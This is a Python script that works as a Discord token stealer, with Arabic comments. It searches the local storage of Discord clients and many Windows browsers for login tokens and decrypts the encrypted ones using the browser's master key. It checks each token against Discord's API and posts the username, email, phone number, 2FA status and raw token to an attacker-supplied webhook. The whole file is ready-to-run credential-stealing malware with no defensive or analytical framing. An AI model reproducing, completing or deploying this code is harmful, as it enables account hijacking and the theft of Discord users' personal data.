import base64
import json
import os
import re
import requests
from Cryptodome.Cipher import AES
from win32crypt import CryptUnprotectData

class Discord:
    def __init__(self, webhook_url):
        self.baseurl = "https://discord.com/api/v9/users/@me"
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.regex = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}"
        self.encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"
        self.tokens_sent = []
        self.tokens = []
        self.ids = []
        self.webhook_url = webhook_url  # رابط الويبهوك

        self.grabTokens()
        self.upload()

    def decrypt_val(self, buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception:
            return "Failed to decrypt password"

    def get_master_key(self, path):
        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def grabTokens(self):
        paths = {
            'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
            'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Firefox': self.roaming + '\\Mozilla\\Firefox\\Profiles'
        }

        for name, path in paths.items():
            if not os.path.exists(path):
                continue
            disc = name.replace(" ", "").lower()
            if "cord" in path:
                if os.path.exists(self.roaming + f'\\{disc}\\Local State'):
                    for file_name in os.listdir(path):
                        if file_name[-3:] not in ["log", "ldb"]:
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for y in re.findall(self.encrypted_regex, line):
                                token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming + f'\\{disc}\\Local State'))
                                r = requests.get(self.baseurl, headers={'Authorization': token})
                                if r.status_code == 200:
                                    uid = r.json()['id']
                                    if uid not in self.ids:
                                        self.tokens.append(token)
                                        self.ids.append(uid)
            else:
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regex, line):
                            r = requests.get(self.baseurl, headers={'Authorization': token})
                            if r.status_code == 200:
                                uid = r.json()['id']
                                if uid not in self.ids:
                                    self.tokens.append(token)
                                    self.ids.append(uid)

    def send_to_webhook(self, message):
        data = {
            "content": message  # إرسال الرسالة كـ 'content' إلى الويبهوك
        }
        response = requests.post(self.webhook_url, json=data)
        if response.status_code != 204:
            print(f"Error sending to webhook: {response.text}")

    def upload(self):
        for token in self.tokens:
            if token in self.tokens_sent:
                continue

            headers = {
                'Authorization': token
            }
            user = requests.get(self.baseurl, headers=headers).json()
            if 'id' not in user:
                print(f"Failed to fetch user data for token: {token}")
                continue

            username = user['username']
            discord_id = user['id']
            email = user['email']
            phone = user.get('phone', 'No phone')
            mfa = ":white_check_mark:" if user.get('mfa_enabled') else ":x:"
            val = f"**Username:** `{username}`\n**Discord ID:** `{discord_id}` \n**Email:** `{email}`\n**Phone:** `{phone}`\n2FA: {mfa}\n**Token:** `{token}`"

            self.send_to_webhook(val)  # إرسال البيانات إلى الويبهوك

        self.tokens_sent.extend(self.tokens)

# استخدام رابط الويبهوك الخاص بك
webhook_url = 'WEBHOOKS_URL'

# إنشاء الكائن وبدء العملية
discord = Discord(webhook_url)
